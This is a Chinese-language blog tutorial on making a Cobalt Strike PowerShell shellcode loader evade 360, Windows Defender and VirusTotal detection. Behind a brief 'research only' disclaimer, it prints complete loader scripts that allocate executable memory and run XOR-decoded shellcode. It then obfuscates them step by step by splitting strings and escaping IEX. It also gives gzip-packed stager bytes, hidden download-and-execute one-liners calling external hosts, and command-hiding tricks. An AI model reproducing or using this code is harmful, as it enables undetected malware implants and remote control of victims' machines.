# Cobalt Strike Powershell过360+Defender上线

## 0x01 生成powershell脚本

> PS：本文仅用于技术研究与讨论，严禁用于非法用途，违者后果自负

前几天看了Y4er大佬免杀思路文章，我按照他的思路扩展了下总结的方法给大家参考，如有问题请大佬执教。

首先通过Cobalt Strike生成的powershell脚本。

![](https://image.3001.net/images/20200911/1599792194.png!small)

```text
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('此处为shellcode，太长就不复制出来了')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
```

然后直接运行生成的powershell脚本，微软的Defender跟360都直接秒杀了

![](https://image.3001.net/images/20200911/1599792604.png!small)

## 0x02 Powershell免杀

现在把FromBase64String改成FromBase65String，那就解决掉FromBase64String，直接改成byte数组。

```text
$string = ''
$s = [Byte[]]$var_code = [System.Convert]::FromBase64String('【cs生成的shellcode】')
$s |foreach { $string = $string + $_.ToString()+','}
```

![](https://image.3001.net/images/20200911/1599792772.png!small)

然后输入$string查看转码后的值，发现进度条拉到顶都看不完。

![](https://image.3001.net/images/20200911/1599792826.png!small)

此时把变量文件输出到文件中查看，有些用户权限不够会报错，更换路径就行了。

```text
$string > c:\1.txt
```

![](https://image.3001.net/images/20200911/1599793747.png!small)

```text
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [Byte[]](这里放刚刚转码后的FromBase65String)

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
```

运行下，测试是否能上线，可以看到是没问题的。

![](https://image.3001.net/images/20200911/1599793860.png!small)

接下来就是上VT查杀看看。https://www.virustotal.com

![](https://image.3001.net/images/20200911/1599793896.png!small)

这样还不能够，继续改关键字。

```text
Set-StrictMode -Version 2

$DoIt = @'
function func_b {
	Param ($amodule, $aprocedure)		
	$aunsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.Uns'+'afeN'+'ativeMethods')
	$agpa = $aunsafe_native_methods.GetMethod('GetP'+'rocAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $agpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($aunsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($amodule)))), $aprocedure))
}

function func_a {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $aparameters,
		[Parameter(Position = 1)] [Type] $areturn_type = [Void]
	)

	$atype_b = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('Reflect'+'edDel'+'egate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDeleg'+'ateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$atype_b.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $aparameters).SetImplementationFlags('Runtime, Managed')
	$atype_b.DefineMethod('Inv'+'oke', 'Public, HideBySig, NewSlot, Virtual', $areturn_type, $aparameters).SetImplementationFlags('Runtime, Managed')

	return $atype_b.CreateType()
}

[Byte[]]$acode =  [Byte[]](这里放刚刚转码后的FromBase65String)

for ($x = 0; $x -lt $acode.Count; $x++) {
	$acode[$x] = $acode[$x] -bxor 35
}

$ava = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_b kernel32.dll VirtualAlloc), (func_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$abuffer = $ava.Invoke([IntPtr]::Zero, $acode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($acode, 0, $abuffer, $acode.length)

$arunme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($abuffer, (func_a @([IntPtr]) ([Void])))
$arunme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) ie`x $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	i`ex $DoIt
}
```

先使用看有没有改到不能上线，再检测免杀能力。

可以成功上线，再来测试免杀。VT完美免杀

![](https://image.3001.net/images/20200911/1599794187.png!small)

![](https://image.3001.net/images/20200911/1599794252.png!small)

## 0x03 生成无落地执行Powershell文件

生成无落地执行powershell文件

![](https://image.3001.net/images/20200911/1599794400.png!small)

访问[http://xxx.xx.xxx.xx:80/a](http://0.0.0.0/a)这个连接看看文件内容，并保存下来

![](https://image.3001.net/images/20200911/1599794823.png!small)

查看VT，一列全红，要是我买的股票这样多好，扯远了，

![](https://image.3001.net/images/20200911/1599794882.png!small)

使用上面方法，直接把FromBase64String改成FromBase65String。

```text
[Byte[]]$var_code =  [Byte[]](31,139,8,0,0,0,0,0,0,0,173,87,109,111,162,218,22,254,92,127,5,31,154,168,169,181,40,214,234,220,76,114,20,65,80,160,10,190,247,52,205,6,182,136,34,32,108,4,60,51,255,253,44,80,123,58,119,58,247,78,114,175,9,113,179,89,175,207,126,214,98,161,97,114,175,145,192,54,136,236,153,152,186,159,225,32,180,61,151,170,23,10,183,61,79,36,212,87,234,143,98,97,29,185,6,201,182,179,197,155,133,201,155,31,120,198,27,50,205,0,135,33,245,87,225,102,132,2,180,167,74,183,71,20,188,237,61,51,114,112,133,202,111,50,65,108,70,1,46,223,220,20,110,242,173,200,13,209,26,191,185,136,216,71,252,182,199,100,227,153,33,56,42,189,116,124,191,231,237,145,237,190,126,249,194,70,65,128,93,114,190,175,246,49,233,132,33,222,235,142,141,195,82,153,250,70,205,55,56,192,247,207,250,22,27,132,250,139,186,125,171,246,29,79,71,206,69,44,101,145,177,129,132,58,174,153,61,147,60,3,101,25,84,53,223,177,73,169,248,231,159,197,242,203,125,237,181,202,29,34,228,132,165,162,150,134,4,239,171,166,227)

$s=New-Object IO.MemoryStream(,$var_code);IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

然后再丢到VT上面查看

![](https://image.3001.net/images/20200911/1599794979.png!small)

不能够啊，还要继续改，首先将byte数组分成两个段。

```text
[Byte[]]$var_c1 =  [Byte[]](31,139,8,0,0,0,0,0,0,0,173,87,109,111,162,218,22,254,92,127,5,31,154,168,169,181,40,214,234,220,76,114,20,65,80,160,10,190,247,52,205,6,182,136,34,32,108,4,60,51,255,253,44,80,123,58,119,58,247,78,114,175,9,113,179,89,175,207,126,214,98,161,97,114,175,145,192,54,136,236,153,152,186,159,225,32,180,61,151,170,23,10,183,61,79,36,212,87,234,143,98,97,29,185,6,201,182,179,197,155,133,201,155,31,120,198,27,50,205,0,135,33,245,87,225,102,132,2,180,167,74,183,71,20,188,237,61,51,114,112,133,202,111,50,187,110,247,28,92,199,128,115,15,33,42,160,68,249)
[Byte[]]$var_c2 =  [Byte[]](199,96,206,103,88,42,138,174,140,247,128,223,249,30,104,122,187,134,50,195,87,233,75,105,165,87,239,217,125,198,101,214,65,97,88,161,70,17,212,185,81,161,52,140,28,108,86,168,142,27,218,151,71,157,136,120,249,178,248,79,184,114,228,16,219,64,33,185,154,123,45,127,2,233,197,53,235,185,80,49,145,1,189,155,171,100,3,217,135,72,62,122,114,114,79,229,11,250,65,228,238,241,255,241,0,126,112,250,223,161,205,192,203,103,186,119,232,242,128,62,199,171,40,254,81,40,136,107,234,195,126,104,159,224,139,5,31,168,86,206,189,144,160,128,220,111,61,29,62,111,242,247,117,233,22,149,41,145,91,80,183,136,250,78,221,67,122,157,144,169,195,55,78,96,69,217,203,155,58,127,178,125,163,98,100,159,21,191,81,42,54,48,140,220,247,3,79,7,150,98,152,193,50,211,185,145,76,24,246,254,6,195,245,1,82,3,14,0,0)
$var_code=$var_c1+$var_c2

$s=New-Object IO.MemoryStream(,$var_code);IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

老规矩使用命令看看是否影响上线

```text
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://0.0.0.0:4545/text.txt'))"
```

注：这里有一点要注意，我把cobalt strike恶意代码链接复制出来另存为一个txt，服务器另外起了一个http服务提供这个txt访问。可以看到上线成功了。

图片中的命令跟上面我写的命令不一样是因为我使用了混淆绕杀软，可以不管，后面会讲。

![](https://image.3001.net/images/20200911/1599795577.png!small)

这次还是不完美，差一个，都是命令没有关键字替换，现在就是用混淆解决。

![](https://image.3001.net/images/20200911/1599795626.png!small)

先上线后查杀

```text
[Byte[]]$var_c1 =  [Byte[]](31,139,8,0,0,0,0,0,0,0,173,87,109,111,162,218,22,254,92,127,5,31,154,168,169,181,40,214,234,220,76,114,20,65,80,160,10,190,247,52,205,6,182,136,34,32,108,4,60,51,255,253,44,80,123,58,119,58,247,78,114,175,9,113,179,89,175,207,126,214,98,161,97,114,175,145,192,54,136,236,153,152,186,159,225,32,180,61,151,170,23,10,183,61,79,36,212,87,234,143,98,97,29,185,6,201,182,179,197,155,133,201,155,31,120,198,27,50,205,0,135,33,245,87,225,102,132,2,180,167,74,183,71,20,188,237,61,51,114,112,133,202,111,50,65,108,70,1,46,223,220,20,110,242,173,200,13,209,26,191,185,136,216,71,252,182,199,100,227,153,33,56,42,189,116,124,191,231,237,145,237,190,126,249,194,70,65,128,93,114,190,175,246,49,233,132,33,222,235,142,141,195,82,153,250,70,205,55,56,192,247,207,250,22,27,132,250,139,186,125,171,246,29,79,71,206,69,44,101,145,177,129,132,58,174,153,61,147,60,3,101,25,84,53,223,177,73,169,248,231,159,197,242,203,125,237,181,202,29,34,228,132,165,162,150,134,4,239,171,166,227,20,203,212,247,114,230,112,146,250,184,84,148,109,35,240,66,111,77,170,115,219,101,234,213,105,30,189,146,7,47,159,99,47,150,47,153,89,62,130,60,126,157,100,102,245,172,83,42,194,114,4,216,116,206,24,22,43,212,75,230,239,229,245,149,250,227,61,26,53,114,137,189,199,85,209,37,56,240,124,13,7,71,219,192,97,85,64,174,233,96,21,175,65,173,24,194,241,185,86,177,12,65,4,152,68,129,75,93,99,1,189,163,183,195,165,91,55,114,156,10,216,125,249,93,187,175,37,5,199,87,112,127,87,169,244,81,9,164,70,36,40,87,46,156,248,29,56,228,156,55,103,115,144,206,79,209,127,32,87,25,126,63,17,172,92,248,94,248,132,170,38,118,176,133,8,126,35,128,239,7,174,22,110,110,94,242,37,134,124,74,35,47,180,115,189,175,20,93,161,100,8,2,17,47,72,179,227,156,4,17,46,191,254,115,62,103,183,87,205,176,242,75,67,181,171,214,69,231,124,60,231,56,190,82,47,51,207,54,95,11,55,229,194,133,61,217,254,155,30,217,142,137,131,236,249,175,171,161,135,215,182,139,123,169,139,246,182,113,37,124,233,179,51,195,107,7,231,120,84,175,98,10,196,89,42,94,30,96,179,119,65,167,152,1,250,242,179,26,183,183,201,187,110,247,28,92,199,128,115,15,33,42,160,68,249)
[Byte[]]$var_c2 =  [Byte[]](199,96,206,103,88,42,138,174,140,247,128,223,249,30,104,122,187,134,50,195,87,233,75,105,165,87,239,217,125,198,101,214,65,97,88,161,70,17,212,185,81,161,52,140,28,108,86,168,142,27,218,151,71,157,136,120,249,178,248,79,184,114,228,16,219,64,33,185,154,123,45,127,2,233,197,53,235,185,80,49,145,1,167,11,48,76,52,31,27,54,114,50,84,42,148,96,155,184,155,106,182,117,13,161,248,41,38,44,114,28,40,57,176,116,132,51,129,157,12,11,141,100,156,9,204,202,191,243,163,92,213,48,17,247,190,131,247,32,157,119,33,222,65,22,244,156,75,69,229,116,67,22,54,139,255,33,236,107,157,156,139,34,195,234,10,210,135,160,129,0,154,227,145,10,53,179,3,2,125,173,88,249,137,120,255,91,120,63,182,152,31,194,100,3,124,57,200,82,94,136,47,221,148,100,229,146,75,26,217,203,229,235,59,150,57,114,1,1,212,248,192,219,119,81,136,155,13,45,111,99,165,34,211,138,14,98,42,111,199,205,160,207,29,121,225,32,112,19,184,142,112,49,7,158,147,164,129,234,119,85,201,224,162,231,145,64,15,214,226,184,144,169,195,55,78,96,69,217,203,155,58,127,178,125,163,98,100,159,21,191,81,42,54,48,140,220,247,3,79,7,150,98,152,193,50,211,185,145,76,24,246,254,6,195,245,1,82,3,14,0,0)
$var_code=$var_c1+$var_c2

$s=New-Object IO.MemoryStream(,$var_code);$a1='IEX (New-Object IO.Strea123'.Replace('123','mRe');$a2='ader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()';IEX($A1+$a2)
```

老规矩，先上线后查杀。

![](https://image.3001.net/images/20200911/1599795870.png!small)

上线成功，没有被杀的了。完美~

![](https://image.3001.net/images/20200911/1599795899.png!small)

## 0x04 总结

VT确实免杀了，不过呢实际执行的时候360跟defender还是会拦截（翻车现场，勿喷），通过混淆执行语句可以绕过，昨天试过了还没问题，今天写文章发现defender的amsi更新了，没有截图。文章的目的也不是直接给大家使用，不是最新版本的直接使用确实没问题，对于最新版的杀软这里的思路还是可用，只是需要加入更多的混淆，或者加一些编码进去。

## 0x05 扩展

下面讲下执行远程执行脚本时代码混淆，有的时候直接执行cs生成的语句杀软会拦截。

原始语句：

```text
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://103.232.213.20:45685/text.txt'))"
```

只是后我们就需要混淆下代码了，可以使用Replace替换关键字部分字母，加上通过拆分后重新组合

例如：

```text
powershell.exe -nop -w hidden -c "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://0.0.0.0:4545/text.txt'')'.Replace('123','adString');IEX ($c1+$c2)"
```

或者

```text
powershell.exe -nop -w hidden -c "$c1='IEX(New-Object Net.WebClient).123'.Replace('123','Downlo');$c2='adString(''httaaa.213.20:45685/text.txt'')'.Replace('aaa','p://103.232/text.txt');IEX ($c1+$c2)"
```

还有powershell语言的特性来混淆代码

常规方法：

```text
cmd.exe /c "powershell -c Write-Host SUCCESS -Fore Green"
```

```text
cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell -"
```

```text
cmd /c "set p1=power&& set p2=shell&& cmd /c echo Write-Host SUCCESS -Fore Green ^|%p1%%p2% -"
```

管道输入流：

```text
cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell IEX $input"
```

利用环境变量：

```text
cmd.exe /c "set cmd=Write-Host ENV -Fore Green&&powershell IEX $env:cmd"
```

```text
cmd.exe /c "set cmd=Write-Host ENV -Fore Green&&cmd /c echo %cmd%|powershell -
```

```text
cmd.exe /c "set cmd=Write-Host ENV -Fore Green&&powershell IEX ([Environment]::GetEnvironmentVariable('cmd', 'Process'))
```

```text
cmd.exe /c "set cmd=Write-Host ENV -Fore Green&&powershell IEX ((Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value)
```

从其他进程获取参数：

```text
cmd /c "title WINDOWS_DEFENDER_UPDATE&&echo IEX (IWR https://7ell.me/power)&& FOR /L %i IN (1,1,1000) DO echo"
```

免杀要不断尝试，活学活用，一次混淆不行多混淆几次，加上替换关键字等。

参考链接：

> [https://y4er.com/post/cobalt-strike-powershell-bypass/](https://y4er.com/post/cobalt-strike-powershell-bypass/)
>
> [https://www.cnblogs.com/linuxsec/articles/7384582.html](https://www.cnblogs.com/linuxsec/articles/7384582.html)

